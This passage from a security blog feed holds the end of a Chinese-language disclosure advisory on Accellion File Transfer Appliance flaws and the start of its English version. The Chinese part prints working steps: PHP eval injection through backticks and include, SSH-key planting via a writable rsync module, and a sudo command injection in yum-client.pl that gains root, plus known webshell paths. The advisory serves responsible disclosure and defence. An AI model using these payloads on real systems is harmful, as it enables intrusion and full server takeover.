&lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;eval&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;如果已知加密 KEY 的話，即可控制 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;decrypt( $_POST[fc] )&lt;/code&gt; 的輸出，而後面的正規表示式雖然針對函數名稱進行白名單過濾，但是沒對參數進行過濾，如此一來我們可以在參數的部分插入任意代碼，唯一的條件就是不能有 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;(&lt;/code&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;)&lt;/code&gt; 出現，但由於 PHP 的鬆散特性，玩法其實很多，這裡列舉兩個：&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;
直接透過反引號執行系統指令：&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;user_profile_auth(`$_POST[cmd]`);&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;br /&gt;
更優雅的方式可以透過 include 語法引入上傳檔案的 tmp_name，這樣各種保護都不用擔心：&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;user_profile_auth(include $_FILES[file][tmp_name]);&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;local-privilege-escalation-cve-2016-2352-and-cve-2016-2353&quot;&gt;Local Privilege Escalation (CVE-2016-2352 and CVE-2016-2353)&lt;/h4&gt;
&lt;p&gt;在取得 PHP 網頁權限後，發現所屬權限為 nobody，為了進行更深入的研究，在對環境進行審視後，發現兩個可用來提升權限之弱點。&lt;/p&gt;

&lt;h5 id=&quot;1-rsync-配置錯誤&quot;&gt;1. Rsync 配置錯誤&lt;/h5&gt;

&lt;div class=&quot;highlight-name&quot;&gt;/etc/opt/rsyncd.conf&lt;/div&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-lighttpd&quot; data-lang=&quot;lighttpd&quot;&gt;log file = /home/soggycat/log/kennel.log
...
[soggycat]
path = /home/soggycat
uid = soggycat
read only = false
list = false
...&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;其中模組名稱 soggycat 對 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/home/soggycat/&lt;/code&gt; 為任何人可讀可寫，所以可將 SSH Key 寫至 /home/soggycat/.ssh/ 後以 soggycat 身分登入&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;bash-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;99&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;nobody&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;99&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;nobody&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;99&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;nobody&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

bash-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;rsync 0::soggycat/.ssh/
drwx------        4096 2016/01/29 18:13:41 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;         606 2016/01/29 18:13:41 authorized_keys

bash-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;rsync 0::soggycat/.ssh/authorized_keys &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
bash-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;id_dsa.pub &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; authorized_keys
bash-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;rsync authorized_keys 0::soggycat/.ssh/

bash-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ssh &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; id_dsa &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;UserKnownHostsFile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/dev/null &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;StrictHostKeyChecking&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;no soggycat@localhost &lt;span class=&quot;nb&quot;&gt;id
&lt;/span&gt;Could not create directory &lt;span class=&quot;s1&quot;&gt;&apos;/.ssh&apos;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Warning: Permanently added &lt;span class=&quot;s1&quot;&gt;&apos;0,0.0.0.0&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; to the list of known hosts.
&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;520&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;soggycat&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;99&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;nobody&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;99&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;nobody&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h5 id=&quot;2-command-injection-in-yum-clientpl&quot;&gt;2. Command Injection in “yum-client.pl”&lt;/h5&gt;

&lt;p&gt;在 FTA 中，為了使系統可以直接透過網頁介面進行更新，因此在 sudoers 配置中特別針對 nobody 用戶允許直接使用 root 權限執行指令，並透過 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;yum-client.pl&lt;/code&gt; 這隻程式進行軟體更新&lt;/p&gt;

&lt;div class=&quot;highlight-name&quot;&gt;/etc/sudoers&lt;/div&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-apache&quot; data-lang=&quot;apache&quot;&gt;&lt;span class=&quot;err&quot;&gt;...&lt;/span&gt;
Cmnd_Alias      YUM_UPGRADE = /usr/bin/yum -y upgrade
Cmnd_Alias      YUM_CLIENT = /usr/local/bin/yum-client.pl
&lt;span class=&quot;err&quot;&gt;...&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# User privilege specification&lt;/span&gt;
root     ALL=(ALL) &lt;span class=&quot;ss&quot;&gt;ALL&lt;/span&gt;
admin    &lt;span class=&quot;ss&quot;&gt;ALL&lt;/span&gt; =NOPASSWD: UPDATE_DNS, UPDATE_GW, UPDATE_NTP, RESTART_NETWORK, CHMOD_OLDTEMP ...
nobody   &lt;span class=&quot;ss&quot;&gt;ALL&lt;/span&gt; =NOPASSWD: SSL_SYSTEM, ADMIN_SYSTEM, IPSEC_CMD, YUM_CLIENT
soggycat &lt;span class=&quot;ss&quot;&gt;ALL&lt;/span&gt; =NOPASSWD: ADMIN_SYSTEM, IPSEC_CMD, CHOWN_IPSEC, UPDATE_IPSEC, YUM_CLIENT
radmin   &lt;span class=&quot;ss&quot;&gt;ALL&lt;/span&gt; =NOPASSWD: RESET_APPL
&lt;span class=&quot;err&quot;&gt;...&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;其中 YUM_CLIENT 就是進行更新的指令，部分代碼如下：&lt;/p&gt;

&lt;div class=&quot;highlight-name&quot;&gt;/usr/local/bin/yum-client.pl&lt;/div&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-perl&quot; data-lang=&quot;perl&quot;&gt;&lt;span class=&quot;o&quot;&gt;...&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;GetOptions&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
   &lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;help&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$help&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
   &lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;download_only&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$download_only&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
   &lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
   &lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;cache&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$cache&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
   &lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;clearcache&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$clearcache&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
   &lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;cdrom=s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$cdrom&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
   &lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;appid=s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$appid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
   &lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;servername=s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$servername&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
   &lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;version=s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$version&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
   &lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;token=s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$token&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;my&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$YUM_CMD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/usr/bin/yum&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&quot;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$cache&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
  &lt;span class=&quot;nv&quot;&gt;$YUM_CMD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$YUM_CMD&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; -C&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&quot;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# if this is based on RHEL 5, change the repository&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;my&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$OS&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;grep -q 5 /etc/redhat-release &amp;amp;&amp;amp; echo -n 5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;`;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;my&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$LOGFILE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/home/seos/log/yum-client.log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&quot;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;my&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$STATUSFILE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/home/seos/log/yum-client.status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&quot;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;my&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$YUMCONFIG&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/etc/yum.conf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&quot;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;my&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$YUMDIFF_FILE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;/home/seos/log/yum.diff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&apos;;&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$cdrom&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$OS&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;eq&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&quot;){&lt;/span&gt;
     &lt;span class=&quot;nv&quot;&gt;$YUM_CMD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$YUM_CMD&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; -c &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$cdrom_path&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/yum.conf-5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&quot;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
     &lt;span class=&quot;nv&quot;&gt;$YUM_CMD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$YUM_CMD&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; -c &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$cdrom_path&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/yum.conf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&quot;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;nb&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;mkdir -p /mnt/cdrom &amp;amp;&amp;amp; mount -o loop &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$cdrom&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$cdrom_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&quot;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;fdielog&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$LOGFILE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;unable to mount: $!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&quot;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;深入觀察 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;yum-client.pl&lt;/code&gt; 後可發現在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--cdrom&lt;/code&gt; 參數上存在 Command Injection，使得攻擊者可將任意指令插入參數內並以 root 身分執行&lt;/p&gt;

&lt;p&gt;所以使用如下指令：&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;bash-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;99&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;nobody&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;99&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;nobody&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;99&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;nobody&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

bash-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; /usr/local/bin/yum-client.pl &lt;span class=&quot;nt&quot;&gt;--cdrom&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;$(id &amp;gt; /tmp/.gg)&apos;&lt;/span&gt;
mount: can&lt;span class=&quot;s1&quot;&gt;&apos;t find /mnt/cdrom in /etc/fstab or /etc/mtab
unable to mount: Bad file descriptor at /usr/local/bin/yum-client.pl line 113.


bash-3.2$ cat /tmp/.gg
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;即可以 root 身分執行任意指令！
&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;後門&quot;&gt;後門&lt;/h3&gt;
&lt;p&gt;&lt;br /&gt;
在取得最高權限後，開始對伺服器進行一些審視時，發現已有幾款後門藏在 FTA 主機中了，經過研究後首先確認一款 IRC BOT 為 Niara 所發布的 &lt;a href=&quot;http://www.niara.com/docs/ta-accellion-fta-cve-2015-2857.pdf&quot;&gt;弱點報告&lt;/a&gt; 中有提及，此外，額外發現兩款不同類型的 PHP Webshell 並無在公開的報告中發現，透過 Apache Log 時間推測應該是透過 2015 年中的 CVE-2015-2857 所放置之後門。&lt;/p&gt;

&lt;p&gt;PHPSPY 後門，全球 1217 台存活主機上共發現 62 台，放置路徑於：&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;https://&amp;lt;fta&amp;gt;/courier/themes/templates/Redirector_Cache.php&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;WSO 後門，全球 1217 台存活主機上共發現 9 台，放置路徑於：&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;https://&amp;lt;fta&amp;gt;/courier/themes/templates/imag.php&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;致謝&quot;&gt;致謝&lt;/h3&gt;
&lt;p&gt;&lt;br /&gt;
這份 Advisory 所提及的弱點為在 2016 二月時參加 Facebook Bug Bounty 時尋找到的，詳情可參考文章《&lt;a href=&quot;https://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script/&quot;&gt;滲透 Facebook 的思路與發現&lt;/a&gt;》，找到弱點的當下立即回報包括 Accellion 及 Facebook，Accellion 並在 2/12 號將此份弱點記錄在 FTA_9_12_40 並通知所有受影響的客戶安裝修補程式。&lt;/p&gt;

&lt;p&gt;感謝 Facebook 以及 Accellion 的迅速反應跟配合 : )
&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;timeline&quot;&gt;Timeline&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;2016/02/06 05:21 聯絡 Accellion 詢問何處可回報弱點&lt;/li&gt;
  &lt;li&gt;2016/02/07 12:35 將報告寄至 Accellion Support Team&lt;/li&gt;
  &lt;li&gt;2016/03/03 03:03 Accellion Support Team 通知會在 FTA_9_12_40  修復&lt;/li&gt;
  &lt;li&gt;2016/05/10 15:18 詢問將撰寫 Advisory 許可及通知發現兩款後門存在&lt;/li&gt;
  &lt;li&gt;2016/06/06 10:20 雙方討論定稿&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;參考&quot;&gt;參考&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://community.rapid7.com/community/metasploit/blog/2015/07/10/r7-2015-08-accellion-file-transfer-appliance-vulnerabilities-cve-2015-2856-cve-2015-2857&quot;&gt;R7-2015-08: Accellion File Transfer Appliance Vulnerabilities (CVE-2015-2856, CVE-2015-2857)&lt;/a&gt; &lt;a name=&quot;ref1&quot;&gt;&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.rapid7.com/resources/advisories/R7-0039.jsp&quot;&gt;Rapid7 Advisory R7-0039: Accellion File Transfer Appliance Multiple Vulnerabilities&lt;/a&gt; &lt;a name=&quot;ref2&quot;&gt;&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://www.niara.com/docs/ta-accellion-fta-cve-2015-2857.pdf&quot;&gt;Threat Advisory: Accellion File Transfer Appliance Vulnerability&lt;/a&gt; &lt;a name=&quot;ref3&quot;&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

</description>
                <link>https://devco.re/blog/2016/09/22/advisory-accellion-file-transfer-appliance-vulnerability/</link>
                <guid>https://devco.re/blog/2016/09/22/advisory-accellion-file-transfer-appliance-vulnerability</guid>
                <pubDate>Thu, 22 Sep 2016 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Advisory: Accellion File Transfer Appliance Vulnerability</title>
                <description>&lt;p&gt;By &lt;a href=&quot;http://blog.orange.tw/&quot;&gt;Orange Tsai&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/blog/2016/09/22/advisory-accellion-file-transfer-appliance-vulnerability-eng-ver/&quot;&gt;English Version&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;/blog/2016/09/22/advisory-accellion-file-transfer-appliance-vulnerability/&quot;&gt;中文版本&lt;/a&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;about-accellion-fta&quot;&gt;About Accellion FTA&lt;/h3&gt;
&lt;p&gt;&lt;br /&gt;
Accellion File Transfer Appliance (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FTA&lt;/code&gt;) is a secure file transfer service which enables users to share and sync files online with AES 128/256 encryption. The Enterprise version further incorporates SSL VPN services with integration of Single Sign-on mechanisms like AD, LDAP and Kerberos.
&lt;br /&gt;&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;vulnerability-details&quot;&gt;Vulnerability Details&lt;/h3&gt;
&lt;p&gt;&lt;br /&gt;
In this research, the following vulnerabilities were discovered on the FTA version FTA_9_12_0 (13-Oct-2015 Release)&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Cross-Site Scripting x 3&lt;/li&gt;
  &lt;li&gt;Pre-Auth SQL Injection leads to Remote Code Execution&lt;/li&gt;
  &lt;li&gt;Known-Secret-Key leads to Remote Code Execution&lt;/li&gt;
  &lt;li&gt;Local Privilege Escalation x 2&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The above-mentioned vulnerabilities allow unauthenticated attackers to remotely attack FTA servers and gain highest privileges successfully. After the attackers fully controlled the servers, they will be able to retrieve the encrypted files and user data, etc.&lt;/p&gt;

&lt;p&gt;After reporting to CERT/CC, these vulnerabilities were assigned 4 CVEs (CVE-2016-2350, CVE-2016-2351, CVE-2016-2352, CVE-2016-2353).&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;areas-affected&quot;&gt;Areas Affected&lt;/h3&gt;
&lt;p&gt;&lt;br /&gt;
According to a public data reconnaissance, there are currently 1,217 FTA servers online around the world, most of which are located in the US, followed by Canada, Australia, UK, and Singapore.&lt;br /&gt;
Determine from the domain name and SSL Certificate of these servers, FTA is widely used by governmental bodies, educational institutions, enterprises, including several well-known brands.&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;

